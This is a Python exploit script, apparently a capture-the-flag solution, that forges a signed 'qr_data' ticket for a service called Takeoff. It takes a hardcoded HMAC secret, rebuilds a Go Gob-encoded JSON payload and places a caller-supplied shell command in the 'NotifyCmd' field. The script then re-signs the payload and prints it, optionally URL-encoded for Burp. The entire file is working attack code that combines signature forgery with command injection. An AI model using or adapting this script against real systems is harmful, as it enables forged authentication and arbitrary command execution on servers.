#!/usr/bin/env python3

import base64
import argparse
import hashlib
import hmac
import json
import urllib.parse

SECRET = (
    b"JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR"
)

ORIGINAL = (
    "ThAAHSpnb2IuVmVyaWZ5VGlja2V0QXV0aGVudGljaXR5fwMBARhWZXJpZnlUaWNr"
    "ZXRBdXRoZW50aWNpdHkB%2F4AAAQEBBERhdGEBCgAAAP%2Bp%2F4D%2FpQH%2FoXsi"
    "UE5SIjoiV0JVWTdCIiwiVG9rZW4iOiJjNjMwZjRmNDViNmI0ZjU2NzVmM2QxYTMw"
    "ZjNkYTg1ZSIsIlNlYXQiOiIxNEMiLCJQYXNzZW5nZXIiOiJqb2huIGRvZSIsIk5v"
    "dGlmeUNtZCI6ImNoZWNrLWluLW5vdGlmeSAtLXBuciBXQlVZN0IgLS1lbWFpbCB0"
    "ZXN0QGdtYWlsLmNvbSJ9ADwEdfYiY4BXxoMhIg%2B90PNKBlNYB7Og8qqGxSwN8jm3"
)


def gob_uint(value):
    if value < 128:
        return bytes([value])

    encoded = value.to_bytes((value.bit_length() + 7) // 8, "big")
    return bytes([256 - len(encoded)]) + encoded


def forge(command):
    original_raw = base64.b64decode(urllib.parse.unquote(ORIGINAL))

    # Retire le HMAC final puis conserve la définition de type Gob.
    original_gob = original_raw[:-32]
    type_definition = original_gob[:79]

    data = {
        "PNR": "WBUY7B",
        "Token": "c630f4f45b6b4f5675f3d1a30f3da85e",
        "Seat": "14C",
        "Passenger": "john doe",
        "NotifyCmd": command,
    }

    json_data = json.dumps(data, separators=(",", ":")).encode()

    # Les tailles Gob incluent leurs propres préfixes, dont la longueur
    # varie à partir de 128 octets. Il faut donc construire chaque niveau
    # avant de calculer la taille du niveau parent.
    inner_value = b"\x01" + gob_uint(len(json_data)) + json_data + b"\x00"
    encoded_value = b"\xff\x80" + gob_uint(len(inner_value)) + inner_value
    gob_data = type_definition + gob_uint(len(encoded_value)) + encoded_value

    signature = hmac.new(SECRET, gob_data, hashlib.sha256).digest()
    final_data = base64.b64encode(gob_data + signature).decode()

    return final_data


parser = argparse.ArgumentParser(
    description="Forge un qr_data Takeoff signé."
)
parser.add_argument(
    "--form",
    action="store_true",
    help="URL-encode la sortie pour un corps HTTP brut/Burp",
)
parser.add_argument("command", help="Commande à placer dans NotifyCmd")
args = parser.parse_args()

output = forge(args.command)
if args.form:
    output = urllib.parse.quote(output, safe="")

print(output, end="")
